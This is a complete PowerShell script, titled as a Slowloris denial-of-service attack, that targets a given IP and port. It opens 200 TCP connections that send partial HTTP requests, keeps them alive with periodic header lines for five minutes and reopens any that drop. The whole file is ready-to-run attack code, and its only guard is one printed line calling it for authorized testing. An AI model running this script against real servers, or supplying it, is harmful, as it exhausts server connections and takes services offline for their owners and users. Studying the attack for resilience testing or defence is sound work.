# Slowloris DoS Attack Script (Windows)
# Usage: .\slowloris.ps1 TARGET
# Target can be IP:PORT, http://IP:PORT, or just IP (defaults to port 80)

param(
    [Parameter(Mandatory=$true)]
    [string]$Target
)

# Parse target - handle IP:PORT format
if ($Target -match '^(.+):(\d+)$') {
    $TargetIP = $matches[1]
    $Port = [int]$matches[2]
} elseif ($Target -match '^https?://(.+):(\d+)') {
    $TargetIP = $matches[1]
    $Port = [int]$matches[2]
} elseif ($Target -match '^https?://(.+)') {
    $TargetIP = $matches[1]
    $Port = 80
} else {
    $TargetIP = $Target
    $Port = 80
}

# Default parameters
$Connections = 200
$Duration = 300

Write-Host "Starting Slowloris Attack on ${TargetIP}:${Port}" -ForegroundColor Yellow
Write-Host "Connections: $Connections | Duration: $Duration seconds" -ForegroundColor Cyan
Write-Host "WARNING: This is for authorized testing only!" -ForegroundColor Red

$endTime = (Get-Date).AddSeconds($Duration)
$sockets = @()

# Create connections
for ($i = 0; $i -lt $Connections; $i++) {
    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $tcpClient.Connect($TargetIP, $Port)
        $stream = $tcpClient.GetStream()
        
        # Send partial HTTP request (keeps connection open)
        $partialRequest = "GET / HTTP/1.1`r`nHost: ${TargetIP}`r`n"
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($partialRequest)
        $stream.Write($bytes, 0, $bytes.Length)
        
        $sockets += @{
            Client = $tcpClient
            Stream = $stream
        }
        
        if (($i + 1) % 50 -eq 0) {
            Write-Host "Created $($i + 1) connections..." -ForegroundColor Cyan
        }
    } catch {
        Write-Host "Failed to create connection $i" -ForegroundColor Yellow
    }
}

Write-Host "`nCreated $($sockets.Count) connections. Maintaining for $Duration seconds..." -ForegroundColor Green

# Keep connections alive
while ((Get-Date) -lt $endTime) {
    foreach ($socket in $sockets) {
        try {
            # Send keep-alive headers periodically
            $keepAlive = "X-a: b`r`n"
            $bytes = [System.Text.Encoding]::ASCII.GetBytes($keepAlive)
            $socket.Stream.Write($bytes, 0, $bytes.Length)
        } catch {
            # Connection closed, remove from list
            $socket.Client.Close()
            $sockets = $sockets | Where-Object { $_ -ne $socket }
        }
    }
    
    Start-Sleep -Seconds 10
    
    # Recreate closed connections
    while ($sockets.Count -lt $Connections -and (Get-Date) -lt $endTime) {
        try {
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $tcpClient.Connect($TargetIP, $Port)
            $stream = $tcpClient.GetStream()
            $partialRequest = "GET / HTTP/1.1`r`nHost: ${TargetIP}`r`n"
            $bytes = [System.Text.Encoding]::ASCII.GetBytes($partialRequest)
            $stream.Write($bytes, 0, $bytes.Length)
            $sockets += @{
                Client = $tcpClient
                Stream = $stream
            }
        } catch {
            break
        }
    }
}

# Close all connections
Write-Host "`nClosing connections..." -ForegroundColor Yellow
foreach ($socket in $sockets) {
    try {
        $socket.Client.Close()
    } catch {
        # Ignore errors
    }
}

Write-Host "Slowloris Attack completed!" -ForegroundColor Green
Write-Host "Maintained $($sockets.Count) connections" -ForegroundColor Cyan

exit 0
